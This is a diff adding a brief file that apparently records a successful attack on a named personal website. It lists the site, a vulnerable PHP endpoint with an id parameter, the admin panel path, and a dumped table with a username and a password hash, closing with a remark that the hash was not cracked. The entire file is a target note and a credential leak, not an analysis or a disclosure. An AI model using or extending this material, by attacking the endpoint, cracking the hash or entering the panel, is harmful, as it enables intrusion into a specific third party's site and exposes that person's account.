@@ -1,0 +1,12 @@
+website: http://www.meggieschneider.com
+vulnerability: http://www.meggieschneider.com/php/detail.php?id=48
+panel:http://www.meggieschneider.com/admin/
+
+Dumped:
++--------+----------------------------------+----+
+| user   | pass                             | ID |
++--------+----------------------------------+----+
+| meggie | 34857ee0ffba0f1a0f63b09ae823f891 | 2  |
++--------+----------------------------------+----+
+
+hash couldn't cracked
